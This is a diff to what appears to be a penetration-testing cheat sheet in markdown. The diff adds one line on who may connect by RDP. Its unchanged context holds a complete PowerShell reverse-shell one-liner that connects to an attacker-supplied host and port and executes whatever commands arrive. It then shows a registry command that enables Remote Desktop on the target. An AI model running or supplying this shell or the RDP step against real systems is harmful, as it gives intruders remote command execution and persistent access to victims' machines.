@@ -86,6 +86,7 @@ PS
 powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('$hip',$hport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 ##### Enable RDP
+Only local Admins and User of the RDP Group can connect via RDP. So you must create an Admin user or give an existing user the correct permissions, see [[9_administrative_hints#Windows]]
 1. Enable Remote Desktop connections
 ```powershell
 Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -Value 0
